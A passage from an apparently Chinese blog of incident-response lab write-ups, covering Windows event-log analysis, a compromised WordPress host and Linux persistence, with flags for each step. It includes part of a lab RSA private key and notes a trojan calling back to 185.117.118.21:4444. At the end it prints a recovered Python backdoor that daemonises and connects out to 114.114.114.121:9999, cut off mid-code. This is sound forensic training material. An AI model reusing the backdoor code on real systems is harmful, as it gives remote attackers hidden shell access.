&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----END RSA Private key-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>所以应该是RSA加AES进行在线解密，用在线网站&lt;a class="link" href="https://try8.cn/tool/cipher/rsa" target="_blank" rel="noopener"
>RSA&lt;/a> &lt;a class="link" href="https://the-x.cn/cryptography/Aes.aspx" target="_blank" rel="noopener"
>AES&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957.png"
width="1055"
height="1259"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957_hu_a04f1cf0790a8765.png 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ%E6%88%AA%E5%9B%BE20250407185957_hu_4a8ebb8a8310af4.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="83"
data-flex-basis="201px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-190335.jpg"
width="1809"
height="713"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-190335_hu_6f0898f077ec782.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-190335_hu_98c78422dbd12bb.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="253"
data-flex-basis="608px"
>&lt;/p>
&lt;p>这里不是很明白为什么来的，就当个了解吧&lt;/p>
&lt;h2 id="第四章-windows日志分析">第四章-windows日志分析
&lt;/h2>&lt;p>首先来peterpan的博客进行信息收集看看有没有什么值得的知识&lt;/p>
&lt;p>&lt;strong>安全日志相关事件 ID&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>4624&lt;/strong> - 成功的账户登录事件
记录登录的账号、时间、来源 IP 等信息，可帮助识别是否有非法登录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4625&lt;/strong> - 账户登录失败事件
记录未能登录的尝试，帮助检测密码爆破或非法访问。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4634&lt;/strong> - 用户注销事件
记录用户主动注销，或超时后系统自动注销。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4648&lt;/strong>- 用户显示凭据登陆&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4672&lt;/strong> - 特权账户登录事件
当管理员或特权账号登录时，记录该事件，检测高权限用户的使用情况。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4688&lt;/strong> - 新进程创建事件
记录进程的创建信息，能帮助检测恶意软件的执行情况。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4697&lt;/strong> - 系统上安装服务的事件
记录系统中安装的服务，可以检测未经授权的服务安装。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4768&lt;/strong> - Kerberos 认证票据授予（TGT）事件
与域控制器的身份验证有关，可以帮助分析域账号是否被滥用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4776&lt;/strong> - NTLM 认证失败事件
在 NTLM 认证失败时记录，可以帮助检测异常的身份验证行为。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>4719&lt;/strong> - 审计策略更改事件
系统审计策略的更改，能帮助判断是否有恶意用户试图掩盖痕迹。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>系统日志相关事件 ID：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>6005&lt;/strong> - 事件日志服务启动
表示系统启动了事件日志服务，通常用于分析系统启动。&lt;/li>
&lt;li>&lt;strong>6006&lt;/strong> - 事件日志服务停止
表示系统即将关机，通常配合其他日志判断系统是否被异常关机。&lt;/li>
&lt;li>&lt;strong>6008&lt;/strong> - 非正常关机事件
系统意外关闭时记录，用于检测系统崩溃或强制关机。&lt;/li>
&lt;li>&lt;strong>7045&lt;/strong> - 服务安装事件
记录系统中安装的新服务，通常用于分析是否有恶意服务被安装。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>应用程序日志相关事件 ID&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>1000&lt;/strong> - 应用程序崩溃事件
记录应用程序崩溃的详细信息，包括错误代码和故障模块名称。&lt;/li>
&lt;li>&lt;strong>4621&lt;/strong> - 应用程序挂起事件
用于分析应用程序无响应、卡死的原因。&lt;/li>
&lt;/ul>
&lt;h3 id="flag1-2">flag1
&lt;/h3>&lt;p>日志分析，这我在行啊(bushi)，进入靶机先把日志dump下来，放到服务器进行命令查询&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">awk &amp;#39;{print $1}&amp;#39; access.log | sort | uniq -c | sort -nr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>得到以下信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> 6331 192.168.150.67
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 524 192.168.150.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 169 127.0.0.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 54 192.168.150.33
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1 192.168.150.60
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>首先&lt;code>127.0.0.1&lt;/code>排除，看日志发现&lt;code>192.168.150.67&lt;/code>在进行目录遍历，&lt;code>192.168.150.1&lt;/code>都是正常的200请求，&lt;code>192.168.150.33&lt;/code>传的一些东西看着像是pickle反序列化，找不出来另外一个请求，再写个命令找找&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">awk &amp;#39;$1 == &amp;#34;192.168.150.60&amp;#34; {print $0}&amp;#39; access.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>是个400请求，应该没问题，得到&lt;code>flag{6385}&lt;/code>&lt;/p>
&lt;h3 id="flag2-2">flag2
&lt;/h3>&lt;p>我们使用事件查看器来解决这个问题，可以&lt;code>win+R&lt;/code>然后输入&lt;code>eventvwr.msc&lt;/code>，也可以在搜索框里面搜索&lt;strong>事件查看器&lt;/strong>，windows日志-&amp;gt;安全-&amp;gt;筛选当前日志&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200425.jpg"
width="1491"
height="903"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200425_hu_fc6c32bbf04977e9.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200425_hu_405f535dd81b632f.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>筛选&lt;strong>4625&lt;/strong>事件看到有2594次，得到&lt;code>flag{2594}&lt;/code>&lt;/p>
&lt;h3 id="flag3-2">flag3
&lt;/h3>&lt;p>还是用这个东西，筛选4624事件，发现有202次，但是我们要的是IP需要，查看事件详细信息可以知道IP&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200915.jpg"
width="1437"
height="810"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200915_hu_68830b39579274ca.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-200915_hu_3c874db12b9120c2.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="177"
data-flex-basis="425px"
>&lt;/p>
&lt;p>因为确实不多，所以我一直在丁真，找出几个个IP得到&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">192.168.150.128
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.33
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.178
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">171.218.191.99
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是实在是太难找了，于是我在想还有没有什么更方便的方法，筛选&lt;strong>4648&lt;/strong>可以知道&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">171.218.191.99
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.178
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.150.128
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>想一起交了的，但是发现不对，看到有一个网段是不一样的，于是我把那个去掉了，发现就对了&lt;code>flag{192.168.150.1&amp;amp;192.168.150.128&amp;amp;192.168.150.178}&lt;/code>&lt;/p>
&lt;h3 id="flag4-2">flag4
&lt;/h3>&lt;p>&lt;code>win+R&lt;/code>打开&lt;code>lusrmgr.msc&lt;/code>，可以打开本地用户组&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203239.jpg"
width="1118"
height="831"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203239_hu_e52fde581b8712bd.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203239_hu_5f92b7f437556182.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>找到&lt;code>flag{hacker$}&lt;/code>&lt;/p>
&lt;h3 id="flag5-1">flag5
&lt;/h3>&lt;p>不知道影子账号是什么，但是很明显啊&lt;code>flag{hackers$}&lt;/code>&lt;/p>
&lt;h3 id="flag6">flag6
&lt;/h3>&lt;p>要找shell程序，我们可以先看看端口&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netstat -ano
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是没发现，搜索框&lt;strong>计划任务&lt;/strong>，发现有个每天都运行的任务&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203904.jpg"
width="1156"
height="312"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203904_hu_ec9cbbe8de7ce90c.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-203904_hu_b854addcf4ca482a.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="370"
data-flex-basis="889px"
>&lt;/p>
&lt;p>进去一看是&lt;code>download xiaowei.exxe&lt;/code>，在这个地方找到&lt;code>C:\Windows\system64\systemWo&lt;/code>文件，放进微步云沙箱&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204248.jpg"
width="1315"
height="563"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204248_hu_511c57072c3f872d.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204248_hu_cfeda2ef301d09b5.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="233"
data-flex-basis="560px"
>&lt;/p>
&lt;p>&lt;code>flag{185.117.118.21:4444}&lt;/code>&lt;/p>
&lt;h3 id="flag7">flag7
&lt;/h3>&lt;p>刚才我们在那个目录找到的文件就是，&lt;code>flag{xiaowei.exe}&lt;/code>，但是为什么运行的时候又是使用的exxe呢，我觉得应该是绕过吧？&lt;/p>
&lt;h3 id="flag8">flag8
&lt;/h3>&lt;p>计划任务里面直接找到bat文件&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204620.jpg"
width="1224"
height="793"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204620_hu_c904147967e9ff9b.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250408-204620_hu_220985966bce1e82.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="370px"
>&lt;/p>
&lt;p>&lt;code>flag{download.bat}&lt;/code>&lt;/p>
&lt;h2 id="第四章-windows实战-wordpress">第四章 windows实战-wordpress
&lt;/h2>&lt;p>链接的时候把端口带上，这里不是22了&lt;/p>
&lt;h3 id="flag1-3">flag1
&lt;/h3>&lt;p>找攻击成功第一时间看日志，先看到是&lt;code>nginx.htaccess&lt;/code>，所以我们看nginx的日志就可以了，一打开一看一大堆的404，这肯定是在目录遍历啊&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-195142.jpg"
width="1572"
height="1205"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-195142_hu_9d1af98d8a6c9d19.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-195142_hu_1ca813116fa69b50.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="130"
data-flex-basis="313px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] &amp;#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1&amp;#34; 302 5 &amp;#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] &amp;#34;GET /manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F HTTP/1.1&amp;#34; 200 7229 &amp;#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] &amp;#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1&amp;#34; 302 5 &amp;#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>虽然说都进行了302跳转，但是下面的才是最后一次，所以成功时间应该是下面的(渗透思路)，不过我是两个都交&lt;code>flag{2023:04:29 22:45:23}&lt;/code>&lt;/p>
&lt;h3 id="flag2-3">flag2
&lt;/h3>&lt;p>看日志里面的指纹就知道了&lt;code>flag{Firefox/110.0}&lt;/code>&lt;/p>
&lt;h3 id="flag3-3">flag3
&lt;/h3>&lt;p>所使用的工具在flag1的图里面已经非常明显了&lt;code>flag{Fuzz Faster U Fool}&lt;/code>&lt;/p>
&lt;h3 id="flag4-3">flag4
&lt;/h3>&lt;p>找恶意插入的后门文件，直接把www给打包放D盾里面，一下就扫出来了，其实刚才日志里面也有利用的痕迹&lt;code>flag{C:\phpstudy_pro\WWW\.x.php}&lt;/code>&lt;/p>
&lt;h3 id="flag5-2">flag5
&lt;/h3>&lt;p>D盾也给扫出来了，里面是个&lt;code>file_get_contents&lt;/code>，直接就交&lt;code>flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}&lt;/code>&lt;/p>
&lt;h3 id="flag6-1">flag6
&lt;/h3>&lt;p>寻找可疑的自启动方式，找exe，在这里找到了&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-200319.jpg"
width="1594"
height="1261"
srcset="https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-200319_hu_472c384dbdb93fd9.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-4/QQ20250407-200319_hu_a98db1a942432151.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="126"
data-flex-basis="303px"
>&lt;/p>
&lt;p>看到了&lt;code>360.exe&lt;/code>，微步的云沙箱弄一弄，确实是木马，那可以整了，直觉有个bat文件，直接交，后来发现也确实是&lt;code>flag{x.bat}&lt;/code>&lt;/p>
&lt;h2 id="第四章-windows实战黑页篡改">第四章 windows实战&amp;ndash;黑页&amp;amp;&amp;amp;篡改
&lt;/h2>&lt;p>大家都没做出来，那我也不去浪费金币了&lt;/p></description></item><item><title>玄机第三章</title><link>https://baozongwi.xyz/p/xuanji-chapter-3/</link><pubDate>Fri, 14 Mar 2025 14:56:32 +0000</pubDate><guid>https://baozongwi.xyz/p/xuanji-chapter-3/</guid><description>&lt;h2 id="第三章-权限维持-linux权限维持-隐藏">第三章 权限维持-linux权限维持-隐藏
&lt;/h2>&lt;h3 id="f1f2">f1&amp;amp;&amp;amp;f2
&lt;/h3>&lt;p>&lt;code>libprocesshider&lt;/code>是用于隐藏文件的项目，一般权限维持都是在&lt;code>/tmp&lt;/code>，包括我打CTF也是这么做的，进入之后依次递进到了&lt;code>/tmp/.temp/libprocesshider&lt;/code>，看到了&lt;code>1.py&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">socket&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="nn">subprocess&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="nn">os&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="nn">sys&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nn">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pidrg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fork&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">pidrg&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">chdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setsid&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">umask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">drgpid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fork&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">drgpid&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">flush&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">flush&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fdreg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/dev/null&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fdreg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stderr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fdreg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sdregs&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">AF_INET&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SOCK_STREAM&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sdregs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">connect&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="s2">&amp;#34;114.114.114.121&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">9999&lt;/span>&lt;span class="p">))&lt;/span>
